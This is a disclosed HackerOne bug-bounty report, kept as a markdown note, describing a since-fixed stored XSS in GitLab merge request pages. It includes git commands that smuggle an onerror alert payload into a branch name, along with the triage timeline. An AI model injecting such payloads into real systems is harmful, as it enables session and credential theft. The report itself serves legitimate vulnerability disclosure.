---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
  - vuln/xss-stored
  - vuln/xss
  - trigger/unauthenticated
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2023-05-30
submitted: 2019-10-26T16:18:30.659Z
bounty_usd: 3500
votes: 53
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "mike12"
source: "https://hackerone.com/reports/723307"
title: "Stored XSS in merge request pages"
---
# Stored XSS in merge request pages

> **Severity:** High | **Bounty:** 3,500 USD | **Votes:** 53 | **Program:** GitLab | **Disclosed:** 2023-05-30

- Report: [https://hackerone.com/reports/723307](https://hackerone.com/reports/723307)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2019-10-26T16:18:30.659Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello Gitlab!

[Vulnerable code](https://gitlab.com/gitlab-org/gitlab/blob/9d81e97d9d111f874799605ce50ae480ae15b0c5/app/assets/javascripts/vue_merge_request_widget/components/states/mr_widget_rebase.vue#L47)

To reproduce the bug, we need to open a merge request with the following conditions:
1. Project must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method
2. The merge request must require rebase before fast-forward/merge
3. A visitor of the merge request page must not have permissions to push to source branch
4. Target branch name must have a special name `<img/src='x'/onerror=alert(document.domain)>` :) 

**Steps to reproduce:**

1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
2. Create a new project
3. Go to the project settings and set the 'Merge method' to 'Fast-forward merge' or 'Merge commit with semi-linear history' {F618529}
4. Clone the repository and run the following in the repository:

    ```bash
    touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
    ```

5. Create a merge request `master` => `<img/src='x'/onerror=alert(document.domain)>`
6. Then we have to visit the merge request page under a user who does not have permissions to push to the source branch (in our case, `master` branch). For example: 
  * Make the project public and visit the merge request page under any user who does not have permissions in the project (or without authorization)
  * Invite a user to the project, but without permissions to push to the source branch.

{F618526}
{F618527}
{F618528}

```bash
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.0
Revision:	1425a56c75b
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
root@gitlab:/# 
```

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

## Timeline

- **Report Filed**
- **2019-10-27** @gitlab-securitybot: Hi @mike12,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 7 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **Bounty Awarded**
- **2019-10-28** @mike12: Awesome, thank you!
- **2020-01-01** @mike12: Hello GitLab!

Are there any updates to this report?
- **2020-01-14** @gitlab-securitybot: ETA for fix:

Hi @mike12,

The issue you reported is currently scheduled to be fixed by 2020-02-29.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2020-01-20** @mike12: Thanks for the bounty!
- **Report Resolved**
- **Agreed On Going Public**
- **2023-05-27** @h1_analyst_shiva: Hi @mike12 and thanks for reaching out,

If you wish to request disclosure, please do so using the provided action menu on your right.

In the event you can't find the "request disclosure" button, we have internally notified the GitLab team of your request. Please make sure to wait for their response before publicly disclosing any information related to this report.

Regards,
@h1_analyst_shiva
- **Agreed On Going Public**
- **Report Became Public**
